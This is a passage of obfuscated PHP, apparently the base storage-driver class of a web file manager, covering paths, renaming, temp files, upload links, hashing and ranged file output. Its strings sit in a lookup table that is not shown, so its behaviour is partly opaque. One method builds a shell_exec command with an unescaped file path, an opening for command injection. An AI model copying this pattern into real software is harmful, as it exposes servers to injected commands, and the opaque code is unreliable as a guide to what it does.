''; public $path = ''; public $pathID = ''; public function __construct() { $f·À¬…Ş§µ =& $_SERVER[‡’¶øåüç˜]; $this->objectDriver = array($f·À¬…Ş§µ[57], $f·À¬…Ş§µ[58], $f·À¬…Ş§µ[59], $f·À¬…Ş§µ[60], $f·À¬…Ş§µ[61], $f·À¬…Ş§µ[62], $f·À¬…Ş§µ[63], $f·À¬…Ş§µ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($CËö÷³ô‡‡) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($CËö÷³ô‡‡, $_SERVER[‡’¶øåüç˜][8]); } return $CËö÷³ô‡‡; } public function getPathName($d½íÈëğ ) { return $d½íÈëğ ; } public function iconvApp($d×Å¶©šœ‹) { return $d×Å¶©šœ‹; } public function iconvSystem($eö áĞ‰ÓÅ) { return $eö áĞ‰ÓÅ; } public function iconvTo($a¢Îİ„—„, $eÊù£ŒÑµ, $Eù§°ŒÎ‰) { goto fëèø‚Ê¿°; C°İ•Š‘Òô: return $fòË“›ïÜã; goto dÜ³¿Í¤…ˆ; fëèø‚Ê¿°: $a‰§ƒ‡†Ÿ‰ =& $_SERVER[‡’¶øåüç˜]; if (!$a¢Îİ„—„ || !function_exists($a‰§ƒ‡†Ÿ‰[65])) { return $a¢Îİ„—„; } static $D¤¿ôˆÌ–™ = array(); goto eÈĞ¡«†; eÈĞ¡«†: $aÆò¶‰éİ = $eÊù£ŒÑµ . $a‰§ƒ‡†Ÿ‰[66] . $Eù§°ŒÎ‰ . $a‰§ƒ‡†Ÿ‰[67] . $a¢Îİ„—„; if (isset($D¤¿ôˆÌ–™[$aÆò¶‰éİ])) { return $D¤¿ôˆÌ–™[$aÆò¶‰éİ]; } if (function_exists($a‰§ƒ‡†Ÿ‰[68])) { $fòË“›ïÜã = @mb_convert_encoding($a¢Îİ„—„, $Eù§°ŒÎ‰, $eÊù£ŒÑµ); } else { $fòË“›ïÜã = @iconv($eÊù£ŒÑµ, $Eù§°ŒÎ‰, $a¢Îİ„—„); } goto e¢¼’ŠËâ; e¢¼’ŠËâ: $fòË“›ïÜã = $fòË“›ïÜã ? $fòË“›ïÜã : $a¢Îİ„—„; if (strstr($fòË“›ïÜã, $a‰§ƒ‡†Ÿ‰[69])) { $fòË“›ïÜã = str_replace($a‰§ƒ‡†Ÿ‰[69], $a‰§ƒ‡†Ÿ‰[70], $fòË“›ïÜã); } $D¤¿ôˆÌ–™[$eÊù£ŒÑµ . $a‰§ƒ‡†Ÿ‰[66] . $Eù§°ŒÎ‰ . $a‰§ƒ‡†Ÿ‰[67] . $a¢Îİ„—„] = $fòË“›ïÜã; goto b‡º‘ö; b‡º‘ö: $D¤¿ôˆÌ–™[$Eù§°ŒÎ‰ . $a‰§ƒ‡†Ÿ‰[66] . $eÊù£ŒÑµ . $a‰§ƒ‡†Ÿ‰[67] . $a¢Îİ„—„] = $a¢Îİ„—„; $D¤¿ôˆÌ–™[$Eù§°ŒÎ‰ . $a‰§ƒ‡†Ÿ‰[66] . $eÊù£ŒÑµ . $a‰§ƒ‡†Ÿ‰[67] . $fòË“›ïÜã] = $a¢Îİ„—„; $D¤¿ôˆÌ–™[$eÊù£ŒÑµ . $a‰§ƒ‡†Ÿ‰[66] . $Eù§°ŒÎ‰ . $a‰§ƒ‡†Ÿ‰[67] . $fòË“›ïÜã] = $fòË“›ïÜã; goto C°İ•Š‘Òô; dÜ³¿Í¤…ˆ: } public function getPathInner($a‚ƒòíñ) { $D£å—‡©Û¿ = IO::init($a‚ƒòíñ); return $D£å—‡©Û¿->path; } public function getPathOuter($c‡¥ –šò) { $Cµ“¹‚áÁè =& $_SERVER[‡’¶øåüç˜]; $aÔ¯ìåíŒ§ = strlen(trim($this->pathBase, $Cµ“¹‚áÁè[8])); $c‡¥ –šò = substr(trim($c‡¥ –šò, $Cµ“¹‚áÁè[8]), $aÔ¯ìåíŒ§); return $this->pathDriver . $Cµ“¹‚áÁè[8] . ltrim($c‡¥ –šò, $Cµ“¹‚áÁè[8]); } public function isParentOf($Bï¶‡¥«±¥, $f’Öªé–) { $aóòÃ‡“¼Ù =& $_SERVER[‡’¶øåüç˜]; $Bï¶‡¥«±¥ = rtrim(strtolower($Bï¶‡¥«±¥), $aóòÃ‡“¼Ù[8]) . $aóòÃ‡“¼Ù[8]; $f’Öªé– = rtrim(strtolower($f’Öªé–), $aóòÃ‡“¼Ù[8]) . $aóòÃ‡“¼Ù[8]; $dÅµßÂˆ¹’ = strpos($f’Öªé–, $Bï¶‡¥«±¥) === 0; return $dÅµßÂˆ¹’; } public function getType() { $DÁ»‡“ˆê± =& $_SERVER[‡’¶øåüç˜]; $D±¬ÚÕŞƒ = str_replace($DÁ»‡“ˆê±[71], $DÁ»‡“ˆê±[33], get_class($this)); return strtolower($D±¬ÚÕŞƒ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($b¥Ç½Ã–Şõ, $e‘ó•ßİÓ‹) { $a¾™µÌ„»¯ =& $_SERVER[‡’¶øåüç˜]; $FÒ’ï×ˆºÃ = rtrim($b¥Ç½Ã–Şõ, $a¾™µÌ„»¯[8]) . $a¾™µÌ„»¯[8] . $e‘ó•ßİÓ‹; $EáÃôÂ¿Åµ = $this->exist($FÒ’ï×ˆºÃ); return $EáÃôÂ¿Åµ ? $FÒ’ï×ˆºÃ : !1; } public function setModifyTime($b‰¢ó‰²Ì, $f‚†ÂŠ¾¤¯ = '') { } public function renameObject($a²ï…‚´Í, $c“¤¸·Ìö) { goto E³ëÏÌÑä; f–…Ù¨¤çø: return $C‚ƒŞ‘Œ¶Ê ? $c“¤¸·Ìö : !1; goto c†ªŞÒ¿; E³ëÏÌÑä: $cÙ—§‹°³‡ =& $_SERVER[‡’¶øåüç˜]; $eğ×¶åÏ• = $c“¤¸·Ìö; Hook::trigger($cÙ—§‹°³‡[72], $this, $a²ï…‚´Í, $this, $this->pathFather($a²ï…‚´Í) . $c“¤¸·Ìö); goto Côèí¶ßà; Côèí¶ßà: $a²ï…‚´Í = $this->getPathOuter($a²ï…‚´Í); $c“¤¸·Ìö = $this->pathFather($a²ï…‚´Í) . $c“¤¸·Ìö; if (IO::isFile($a²ï…‚´Í)) { $C‚ƒŞ‘Œ¶Ê = IO::copy($a²ï…‚´Í, $this->pathFather($a²ï…‚´Í), REPEAT_RENAME_FOLDER, $eğ×¶åÏ•); if ($C‚ƒŞ‘Œ¶Ê) { IO::remove($a²ï…‚´Í); } } else { $C‚ƒŞ‘Œ¶Ê = IO::mkdir($c“¤¸·Ìö); if (!$C‚ƒŞ‘Œ¶Ê) { return !1; } $e½£Âõà‰Ø = IO::listPath($a²ï…‚´Í, !0); $cé©œÇôî = array_merge($e½£Âõà‰Ø[$cÙ—§‹°³‡[73]], $e½£Âõà‰Ø[$cÙ—§‹°³‡[74]]); foreach ($cé©œÇôî as $aŸÚåÖÌêæ) { IO::move($aŸÚåÖÌêæ[$cÙ—§‹°³‡[75]], $c“¤¸·Ìö, REPEAT_RENAME_FOLDER); } IO::remove($a²ï…‚´Í); } goto f–…Ù¨¤çø; c†ªŞÒ¿: } public function tempFile($A¨•ä˜ª¦ = '', $bã´£±ƒ³Ã = '') { goto cÖ¼ÂÍ‹º·; d«“ùÁé¾: $Eç¸í»‡Î = $c¿õİÔ¶Í› . $A¨•ä˜ª¦; @touch($Eç¸í»‡Î); if ($bã´£±ƒ³Ã) { file_put_contents($Eç¸í»‡Î, $bã´£±ƒ³Ã); } goto b‡²Š©‚¼; cÖ¼ÂÍ‹º·: if (!$A¨•ä˜ª¦) { $A¨•ä˜ª¦ = rand_string(15); } $c¿õİÔ¶Í› = TEMP_FILES . rand_string(15) . $_SERVER[‡’¶øåüç˜][8]; @mkdir($c¿õİÔ¶Í›, 511, !0); goto d«“ùÁé¾; b‡²Š©‚¼: return $Eç¸í»‡Î; goto FŠ«İØÊ¡†; FŠ«İØÊ¡†: } public function tempFileRemve($cº”¦çÁ§ó) { @unlink($cº”¦çÁ§ó); @rmdir($this->pathFather($cº”¦çÁ§ó)); } public function mkfile($f ÚÒí»ƒ , $Fõ´ø›Æ† = '', $Bó¯µšª—¿ = REPEAT_RENAME) { } public function mkdir($f©‰‚ëÖ›á, $dµ™äÒÜ¤ = REPEAT_SKIP) { } public function delFile($E¢éŸêä“) { } public function delFolder($c´Ö¢•ó©) { } public function copyFile($F‹ªÀ¿ğ†™, $BŞœ‹ŸÃâ”) { } public function moveFile($e„®ÒÒ…¼ˆ, $A“ó¸±Šø–) { } public function remove($fùº®Úƒç…) { if ($this->isFile($fùº®Úƒç…)) { return $this->delFile($fùº®Úƒç…); } return $this->delFolder($fùº®Úƒç…); } public function rename($a¼óéÅº§Ï, $AÓŸÓ›Ï¼Á) { } public function exist($C¥šå§Ø¦ò) { } public function findByHash($EˆÎÚÂÉ = '', $f’çƒ‹éÆ = '') { return !1; } public function isFile($AĞÅ‘×ÕÜ) { } public function isFolder($b¢ßè‹ë¦¥) { } public function size($aí‰äœ) { } public function info($B¸½¿‚÷–ö) { } public function infoSimple($eáï±Ë¥‹Õ) { return $this->info($eáï±Ë¥‹Õ); } public function infoAuth($d“°ô®Œ) { return $this->info($d“°ô®Œ); } public function infoFull($CóŸ„Ûá»×) { return $this->info($CóŸ„Ûá»×); } public function infoWithChildren($C„¾µØ…»Õ) { $añÛ–ö­ Î =& $_SERVER[‡’¶øåüç˜]; static $bè›™Ä’§Ç = array(); if (isset($bè›™Ä’§Ç[$C„¾µØ…»Õ])) { return $bè›™Ä’§Ç[$C„¾µØ…»Õ]; } $FÈ°òÓÃî¥ = $this->info($C„¾µØ…»Õ); if ($FÈ°òÓÃî¥ && $FÈ°òÓÃî¥[$añÛ–ö­ Î[29]] == $añÛ–ö­ Î[76]) { $D§µÔ‚îğµ = array($añÛ–ö­ Î[77] => 0, $añÛ–ö­ Î[78] => 0, $añÛ–ö­ Î[79] => 0); $this->infoChildren($C„¾µØ…»Õ, $D§µÔ‚îğµ); $FÈ°òÓÃî¥[$añÛ–ö­ Î[77]] = $D§µÔ‚îğµ[$añÛ–ö­ Î[77]]; $FÈ°òÓÃî¥[$añÛ–ö­ Î[80]] = array($añÛ–ö­ Î[81] => $D§µÔ‚îğµ[$añÛ–ö­ Î[78]], $añÛ–ö­ Î[82] => $D§µÔ‚îğµ[$añÛ–ö­ Î[79]]); $bè›™Ä’§Ç[$C„¾µØ…»Õ] = $FÈ°òÓÃî¥; } return $FÈ°òÓÃî¥; } public function listPath($FòÊ¤ë, $D·¨²Úò¬¬ = false) { } public function has($fİÇ¦ùÆÃ¿, $E¥®¨Í„´Ã = false, $aÔ©ãÁˆİâ = false) { } public function canRead($c£Ë§´ãÓº) { } public function canWrite($dŠÌ¢ê¼ó) { } public function getContent($eŒñ²Í¦¦) { } public function setContent($C¬İ¬ÀºÑ, $Bé¥® ßòœ = '') { } protected function infoChildren($bŠ¢”è…ç, &$a®âŸÌ§ÕŒ) { $EƒÃ‡ƒé„— =& $_SERVER[‡’¶øåüç˜]; check_abort(); $E²£øÌÒÈ = $this->listPath($bŠ¢”è…ç, !0); $E²£øÌÒÈ = array_merge($E²£øÌÒÈ[$EƒÃ‡ƒé„—[74]], $E²£øÌÒÈ[$EƒÃ‡ƒé„—[73]]); foreach ($E²£øÌÒÈ as $F¿ì’•–¹ù) { if ($F¿ì’•–¹ù[$EƒÃ‡ƒé„—[29]] == $EƒÃ‡ƒé„—[76]) { $a®âŸÌ§ÕŒ[$EƒÃ‡ƒé„—[79]]++; $dÌàÂîŒîœ = $this->getPathInner($F¿ì’•–¹ù[$EƒÃ‡ƒé„—[75]]); $this->infoChildren($dÌàÂîŒîœ, $a®âŸÌ§ÕŒ); } else { $a®âŸÌ§ÕŒ[$EƒÃ‡ƒé„—[78]]++; $a®âŸÌ§ÕŒ[$EƒÃ‡ƒé„—[77]] += $F¿ì’•–¹ù[$EƒÃ‡ƒé„—[77]]; } } } public function fileSubstr($F¦¼¡†, $aÒ¢›È·À¬, $Dõ²ËºÔÜÒ) { } public function listAll($Eß·éĞã) { } public function upload($cªáÅ’ñÓ, $Bš™Ù¾¨·©, $E‹æ³«Îô = false, $Aò÷õÀÍƒ = REPEAT_REPLACE) { } public function uploadFileByID($f§âõœßöØ, $E§ñ³ö˜£, $dÀ¦°½¤—â) { } public function uploadFileByPath($d±ò¹¸±Œ, $b†¥ÊäçÏ», $dÄÅÌö—ù = array()) { } public function isUploadServer() { $f¸‘ÊšÁÒï =& $_SERVER[‡’¶øåüç˜]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $f¸‘ÊšÁÒï[83]) { return !0; } return $GLOBALS[$f¸‘ÊšÁÒï[6]][$f¸‘ÊšÁÒï[84]][$f¸‘ÊšÁÒï[85]]; } public function isFileOutServer() { $eÜ½°ĞŠô =& $_SERVER[‡’¶øåüç˜]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $eÜ½°ĞŠô[83]) { return !0; } return $GLOBALS[$eÜ½°ĞŠô[6]][$eÜ½°ĞŠô[84]][$eÜ½°ĞŠô[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($bªŒº¿ÒÎ») { $Aî²½Ä Ø± =& $_SERVER[‡’¶øåüç˜]; if (!$this->isCdnHost()) { return $bªŒº¿ÒÎ»; } return str_replace(trim(get_url_root($bªŒº¿ÒÎ»), $Aî²½Ä Ø±[8]), trim($this->cdnHost, $Aî²½Ä Ø±[8]), $bªŒº¿ÒÎ»); } public function uploadLink($eø°»ãÛ¼§, $F¦ãà¶®ì³ = 0) { goto f‹ƒÄÖÕ ¼; f«‚¶°‰ç: if ($AÓÂäÖ¹í) { $AÓÂäÖ¹í[$DÂé™ Òì½[89]] = $eø°»ãÛ¼§; $AÓÂäÖ¹í[$DÂé™ Òì½[90]] = $BÌîÉ•µ¿›; } return $AÓÂäÖ¹í; goto E”ÙÊ šöé; cÕ‡ßÇ‡À©: if (!in_array($BÌîÉ•µ¿›, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $fºÂ›Æó²  = 1024 * 1024 * 10; goto f’¥ª…±®©; f‹ƒÄÖÕ ¼: $DÂé™ Òì½ =& $_SERVER[‡’¶øåüç˜]; if ($this->isUploadServer()) { return; } $BÌîÉ•µ¿› = $this->getType(); goto cÕ‡ßÇ‡À©; f’¥ª…±®©: $FõÏÙ™º…º = $F¦ãà¶®ì³ <= $fºÂ›Æó²  ? $DÂé™ Òì½[87] : $DÂé™ Òì½[88]; $fÇÃ¹¼Íš„ = (!$F¦ãà¶®ì³ ? 1 : ceil($F¦ãà¶®ì³ / pow(1024, 3))) * 3600 * 4; $AÓÂäÖ¹í = $this->{$FõÏÙ™º…º}($eø°»ãÛ¼§, $fÇÃ¹¼Íš„); goto f«‚¶°‰ç; E”ÙÊ šöé: } public function uploadFormData($F« æ¸§Àà, $Bì„©¹İ…œ = 3600) { } public function multiUploadFormData($B„ŒÑÅñœ¤, $c‡åö†ÚŞ§ = 3600) { } public function download($F…±íŸ“š¸, $cíˆÔÚ‡Ú½) { } public function ext($DÂˆ¾Œ½£ö) { $bŒô­‰À…ã =& $_SERVER[‡’¶øåüç˜]; if (strpos($DÂˆ¾Œ½£ö, $bŒô­‰À…ã[8]) === -1) { $eÏÏ¥÷ğ· = $DÂˆ¾Œ½£ö; } else { $eÏÏ¥÷ğ· = $this->pathThis($DÂˆ¾Œ½£ö); } $Cï¢Ñ¥Çö× = $bŒô­‰À…ã[33]; if (strstr($eÏÏ¥÷ğ·, $bŒô­‰À…ã[91])) { $Cï¢Ñ¥Çö× = substr($eÏÏ¥÷ğ·, strrpos($eÏÏ¥÷ğ·, $bŒô­‰À…ã[91]) + 1); $Cï¢Ñ¥Çö× = strtolower($Cï¢Ñ¥Çö×); } if (strlen($Cï¢Ñ¥Çö×) > 3 && preg_match($bŒô­‰À…ã[92], $Cï¢Ñ¥Çö×, $A›ÜÙ„½Ÿ)) { $Cï¢Ñ¥Çö× = $bŒô­‰À…ã[33]; } return $Cï¢Ñ¥Çö×; } public function pathThis($bŠÊŸè–Ñ) { $DˆÑïãÄ´ =& $_SERVER[‡’¶øåüç˜]; $bŠÊŸè–Ñ = str_replace($DˆÑïãÄ´[93], $DˆÑïãÄ´[8], rtrim($bŠÊŸè–Ñ, $DˆÑïãÄ´[8])); $aóåä«†Õ… = strrpos($bŠÊŸè–Ñ, $DˆÑïãÄ´[8]); if ($aóåä«†Õ… === !1) { return $bŠÊŸè–Ñ; } return substr($bŠÊŸè–Ñ, $aóåä«†Õ… + 1); } public function pathFather($a§Äòé•ç») { $A£•¬êÆ…‡ =& $_SERVER[‡’¶øåüç˜]; $a§Äòé•ç» = str_replace($A£•¬êÆ…‡[93], $A£•¬êÆ…‡[8], rtrim($a§Äòé•ç», $A£•¬êÆ…‡[8])); $eâ´Ö½ë‹÷ = strrpos($a§Äòé•ç», $A£•¬êÆ…‡[8]); if ($eâ´Ö½ë‹÷ === !1) { return $A£•¬êÆ…‡[33]; } return substr($a§Äòé•ç», 0, $eâ´Ö½ë‹÷ + 1); } public function hashSimple($bÌàÅ¼á˜) { goto a×±¾»¤É; aà”À©ëÛö: $E»¿å¬†ø = 200; $D–ßáÔÚÄ = 50; if ($CÓ†—ºÜÙ• <= $E»¿å¬†ø * $D–ßáÔÚÄ) { return $this->hashMd5($bÌàÅ¼á˜) . $CÓ†—ºÜÙ•; } goto D­İä’÷ŸÈ; a×±¾»¤É: $aäÎô³ï¸Ğ =& $_SERVER[‡’¶øåüç˜]; if (!$bÌàÅ¼á˜) { return md5($aäÎô³ï¸Ğ[33]); } $CÓ†—ºÜÙ• = $this->size($bÌàÅ¼á˜); goto aà”À©ëÛö; E¥ˆÄå›Ç™: $EÌ´”õÆ¼Û .= $this->fileSubstr($bÌàÅ¼á˜, $CÓ†—ºÜÙ• - $E»¿å¬†ø, $E»¿å¬†ø); return md5($EÌ´”õÆ¼Û) . $CÓ†—ºÜÙ•; goto eŒğõĞ×„Ï; D­İä’÷ŸÈ: $cĞ§Ùßµ¦› = intval($CÓ†—ºÜÙ• / $D–ßáÔÚÄ); $EÌ´”õÆ¼Û = $aäÎô³ï¸Ğ[33]; for ($Bƒå“¦±ì = 0; $Bƒå“¦±ì < $D–ßáÔÚÄ; $Bƒå“¦±ì++) { $EÌ´”õÆ¼Û .= $this->fileSubstr($bÌàÅ¼á˜, $cĞ§Ùßµ¦› * $Bƒå“¦±ì, $E»¿å¬†ø); } goto E¥ˆÄå›Ç™; eŒğõĞ×„Ï: } public static $md5Cache = array(); public function hashMd5($D²Ã­Íå„) { $D²Ã­Íå„ = $this->iconvSystem($D²Ã­Íå„); if (isset(self::$md5Cache[$D²Ã­Íå„])) { return self::$md5Cache[$D²Ã­Íå„]; } self::$md5Cache[$D²Ã­Íå„] = $this->hashMd5Shell($D²Ã­Íå„); if (!self::$md5Cache[$D²Ã­Íå„]) { self::$md5Cache[$D²Ã­Íå„] = @md5_file($D²Ã­Íå„); } return self::$md5Cache[$D²Ã­Íå„]; } private function hashMd5Shell($aˆÁÎºÉ¢¿) { goto cñõ©Ğíô; cñõ©Ğíô: $EŸğãŒ‰›Œ =& $_SERVER[‡’¶øåüç˜]; if (!function_exists($EŸğãŒ‰›Œ[94])) { return !1; } $BÔøºÒàí = array($EŸğãŒ‰›Œ[95], $EŸğãŒ‰›Œ[96]); goto dáÎİª¡ß; aÛÆï¥‘œ: $fê„Åèù¯ = shell_exec($dô¥»£öØÉ . "\40\x22{$aˆÁÎºÉ¢¿}\42"); $fê„Åèù¯ = str_replace($EŸğãŒ‰›Œ[100], $EŸğãŒ‰›Œ[33], $fê„Åèù¯); return substr($fê„Åèù¯, 0, 32); goto C§ÒÕªÔÅÑ; dáÎİª¡ß: $dô¥»£öØÉ = Cache::get($EŸğãŒ‰›Œ[97]); if (!$dô¥»£öØÉ) { $b¸°Œ¾®Œë = BASIC_PATH . $EŸğãŒ‰›Œ[98]; $Fø‹Øš‰†¢ = md5_file($b¸°Œ¾®Œë); $dô¥»£öØÉ = $EŸğãŒ‰›Œ[99]; foreach ($BÔøºÒàí as $FõÅ’´»Û) { $fê„Åèù¯ = shell_exec($FõÅ’´»Û . "\x20\x22{$b¸°Œ¾®Œë}\x22"); if ($fê„Åèù¯ && substr(trim($fê„Åèù¯), 0, 32) == $Fø‹Øš‰†¢) { $dô¥»£öØÉ = $FõÅ’´»Û; break; } } Cache::set($EŸğãŒ‰›Œ[97], $dô¥»£öØÉ, 3600); } if ($dô¥»£öØÉ == $EŸğãŒ‰›Œ[99]) { return !1; } goto aÛÆï¥‘œ; C§ÒÕªÔÅÑ: } public function link($C‹†ó¸“â ) { return $C‹†ó¸“â ; } public function fileOut($eƒ×Üì‰¡’, $F®ŒĞÇ‡óŒ = false, $aĞÁ§íÏÛÀ = false, $bƒİ£”ù†¹ = '') { goto c¤¬Ñ‘¨š‘; bëÖºÙŸÖõ: $Bîñò’êğ¬ = !0; if ($_SERVER[$E“•ğ½ùÉ¤[151]] == $E“•ğ½ùÉ¤[152] && $c‚ÃÂßêÖ > 1204 * 1024 * 1024 * 2) { $Bîñò’êğ¬ = !1; } if ($Bîñò’êğ¬) { header($E“•ğ½ùÉ¤[153] . ($C›øê¡‚Ş - $d²­¦¾–Ê† + 1)); } goto Eİç²Ñäƒ; B´¡æ£Úâ„: $b®Êë ¥Äæ = strtolower($_SERVER[$E“•ğ½ùÉ¤[139]]); if ($dÈ×‘œ…¬‹ && $b®Êë ¥Äæ && $BÚïÒ°™«„) { if (strstr($b®Êë ¥Äæ, $E“•ğ½ùÉ¤[140])) { header($E“•ğ½ùÉ¤[141] . $eƒ×Üì‰¡’); } else { if (strstr($b®Êë ¥Äæ, $E“•ğ½ùÉ¤[142])) { header($E“•ğ½ùÉ¤[143] . $eƒ×Üì‰¡’); } else { if (strstr($b®Êë ¥Äæ, $E“•ğ½ùÉ¤[144])) { header($E“•ğ½ùÉ¤[145] . $eƒ×Üì‰¡’); } } } if ($b£¨ñó²°®) { header($E“•ğ½ùÉ¤[146] . $b£¨ñó²°®); } return; } if (isset($_SERVER[$E“•ğ½ùÉ¤[147]])) { if (preg_match($E“•ğ½ùÉ¤[148], $_SERVER[$E“•ğ½ùÉ¤[147]], $då½Ô åÖ)) { $d²­¦¾–Ê† = intval($då½Ô åÖ[1]); if (!empty($då½Ô åÖ[2])) { $C›øê¡‚Ş = intval($då½Ô åÖ[2]); } } header($E“•ğ½ùÉ¤[149]); header("\103\x6f\x6e\x74\x65\x6e\x74\55\x52\x61\156\147\145\x3a\40\142\171\164\x65\x73\40{$d²­¦¾–Ê†}\55{$C›øê¡‚Ş}\x2f" . $c‚ÃÂßêÖ); } else { header($E“•ğ½ùÉ¤[150]); } goto bëÖºÙŸÖõ; F‰¿’î£«Ì: if (in_array($dÊôÊùò×, array($E“•ğ½ùÉ¤[108], $E“•ğ½ùÉ¤[109], $E“•ğ½ùÉ¤[110], $E“•ğ½ùÉ¤[111]))) { $dÊôÊùò× = $E“•ğ½ùÉ¤[112]; } if (!$bƒİ£”ù†¹) { $bƒİ£”ù†¹ = md5($D¢™ç¥š¾ . $this->hashSimple($eƒ×Üì‰¡’)); } $bƒİ£”ù†¹ = $E“•ğ½ùÉ¤[113] . $bƒİ£”ù†¹ . $E“•ğ½ùÉ¤[113]; goto e¢ ‘·ª‹¤; E­Ã¾°§õ‡: $d²­¦¾–Ê† = 0; $C›øê¡‚Ş = $c‚ÃÂßêÖ - 1; $dÊôÊùò× = $this->ext($bÖ¹ë§„«); goto F‰¿’î£«Ì; A©õÒ÷ß‹: header($E“•ğ½ùÉ¤[125]); header($E“•ğ½ùÉ¤[126]); header($E“•ğ½ùÉ¤[127]); goto d˜õ‰Œ£ŸÏ; D®Š„¬ôó©: header($E“•ğ½ùÉ¤[135] . $c‚ÃÂßêÖ); header($E“•ğ½ùÉ¤[136]); if (!$F®ŒĞÇ‡óŒ && $dÊôÊùò× == $E“•ğ½ùÉ¤[137]) { if ($c‚ÃÂßêÖ > 1024 * 1024 * 5) { die; } $B÷ë¥Ì¿Æä = $this->getContent($eƒ×Üì‰¡’); $B÷ë¥Ì¿Æä = Html::clearSVG($B÷ë¥Ì¿Æä); header($E“•ğ½ùÉ¤[138] . $c‚ÃÂßêÖ); echo $B÷ë¥Ì¿Æä; die; } goto B´¡æ£Úâ„; a›¤ˆ‹ƒ§¥: @ob_end_clean(); set_timeout(); $DÊÎ‰›×Ü = $this->infoFull($eƒ×Üì‰¡’); goto Cæ­»ÌÈ; eÇ‘õ²±ğÊ: $dÈ×‘œ…¬‹ = $this->getType() == $E“•ğ½ùÉ¤[102]; $BÚïÒ°™«„ = $GLOBALS[$E“•ğ½ùÉ¤[6]][$E“•ğ½ùÉ¤[84]][$E“•ğ½ùÉ¤[103]][$E“•ğ½ùÉ¤[104]]; $b£¨ñó²°® = (double) $GLOBALS[$E“•ğ½ùÉ¤[6]][$E“•ğ½ùÉ¤[84]][$E“•ğ½ùÉ¤[103]][$E“•ğ½ùÉ¤[105]] * 1024 * 1024; goto a›¤ˆ‹ƒ§¥; e¢ ‘·ª‹¤: $EÏŒÖ…ùŠ = get_file_mime($dÊôÊùò×); if (strstr($EÏŒÖ…ùŠ, $E“•ğ½ùÉ¤[114])) { $EÏŒÖ…ùŠ = $EÏŒÖ…ùŠ . $E“•ğ½ùÉ¤[115]; } if ($F®ŒĞÇ‡óŒ === !1 && !mime_support($EÏŒÖ…ùŠ)) { $F®ŒĞÇ‡óŒ = !0; $EÏŒÖ…ùŠ = $E“•ğ½ùÉ¤[116]; } goto D•èŞ´Ëî‘; Eİç²Ñäƒ: if ($_SERVER[$E“•ğ½ùÉ¤[154]] == $E“•ğ½ùÉ¤[155]) { return; } $cÍõÊ²Ø˜İ = 1024 * 100; $D…é»£ŠšË = 0; goto AÉ‚Ç…œÂ; AÉ‚Ç…œÂ: if ($b£¨ñó²°®) { $D…é»£ŠšË = intval(1000 * 1000 * ($cÍõÊ²Ø˜İ / $b£¨ñó²°®)); } while ($d²­¦¾–Ê† <= $C›øê¡‚Ş) { $AñÇõƒ¯ÑÇ = timeFloat(); check_abort(); $D¦Æ‚Òù˜´ = $C›øê¡‚Ş - $d²­¦¾–Ê† + 1; if ($D¦Æ‚Òù˜´ <= $cÍõÊ²Ø˜İ) { $cÍõÊ²Ø˜İ = $D¦Æ‚Òù˜´; } echo $this->fileSubstr($eƒ×Üì‰¡’, $d²­¦¾–Ê†, $cÍõÊ²Ø˜İ); $d²­¦¾–Ê† += $cÍõÊ²Ø˜İ; if ($cÍõÊ²Ø˜İ == $D¦Æ‚Òù˜´) { $d²­¦¾–Ê† = $C›øê¡‚Ş + 1; } if ($D…é»£ŠšË) { $C•ÏŞÊ–É = intval(1000 * 1000 * (timeFloat() - $AñÇõƒ¯ÑÇ)); $Dé»¿ê§ëº = $D…é»£ŠšË - $C•ÏŞÊ–É; if ($Dé»¿ê§ëº > 5) { usleep($Dé»¿ê§ëº); } } } goto CÊéÎ¯ìå´; c¤¬Ñ‘¨š‘: $E“•ğ½ùÉ¤ =& $_SERVER[‡’¶øåüç˜]; $this->cacheMethod(null, null); if (!$eƒ×Üì‰¡’ || !$this->exist($eƒ×Üì‰¡’)) { show_json(LNG($E“•ğ½ùÉ¤[101]), !1, $aĞÁ§íÏÛÀ); } goto eÇ‘õ²±ğÊ; D•èŞ´Ëî‘: $cêÔ¬ê·« = rawurlencode($bÖ¹ë§„«); $cêÔ¬ê·« = $E“•ğ½ùÉ¤[113] . $cêÔ¬ê·« . $E“•ğ½ùÉ¤[117] . $cêÔ¬ê·«; if ($F®ŒĞÇ‡óŒ) { header($E“•ğ½ùÉ¤[118]); header($E“•ğ½ùÉ¤[119] . $cêÔ¬ê·«); } else { header($E“•ğ½ùÉ¤[120] . $cêÔ¬ê·«); } goto FÚßÑÁ¦ÙÂ; Cæ­»ÌÈ: $c‚ÃÂßêÖ = $DÊÎ‰›×Ü[$E“•ğ½ùÉ¤[77]]; $D¢™ç¥š¾ = gmdate($E“•ğ½ùÉ¤[106], $DÊÎ‰›×Ü[$E“•ğ½ùÉ¤[107]]); $bÖ¹ë§„« = $aĞÁ§íÏÛÀ ? $aĞÁ§íÏÛÀ : $this->iconvApp($DÊÎ‰›×Ü[$E“•ğ½ùÉ¤[28]]); goto E­Ã¾°§õ‡; d˜õ‰Œ£ŸÏ: if (isset($_SERVER[$E“•ğ½ùÉ¤[128]]) && strtotime($_SERVER[$E“•ğ½ùÉ¤[128]]) == $DÊÎ‰›×Ü[$E“•ğ½ùÉ¤[107]]) { header($E“•ğ½ùÉ¤[129], !0, 304); die; } if (isset($_SERVER[$E“•ğ½ùÉ¤[130]]) && $_SERVER[$E“•ğ½ùÉ¤[130]] == $bƒİ£”ù†¹) { header($E“•ğ½ùÉ¤[131] . $bƒİ£”ù†¹, !0, 304); die; } header($E“•ğ½ùÉ¤[131] . $bƒİ£”ù†¹); goto EëÓ¶¿ÚÃ±; EëÓ¶¿ÚÃ±: header($E“•ğ½ùÉ¤[132] . $D¢™ç¥š¾ . $E“•ğ½ùÉ¤[124]); header($E“•ğ½ùÉ¤[133] . $bÖ¹ë§„«); header($E“•ğ½ùÉ¤[134]); goto D®Š„¬ôó©; FÚßÑÁ¦ÙÂ: header($E“•ğ½ùÉ¤[121]); header($E“•ğ½ùÉ¤[122] . $EÏŒÖ…ùŠ); header($E“•ğ½ùÉ¤[123] . gmdate($E“•ğ½ùÉ¤[106], time() + 3600 * 24 * 30) . $E“•ğ½ùÉ¤[124]); goto A©õÒ÷ß‹; CÊéÎ¯ìå´: } public function 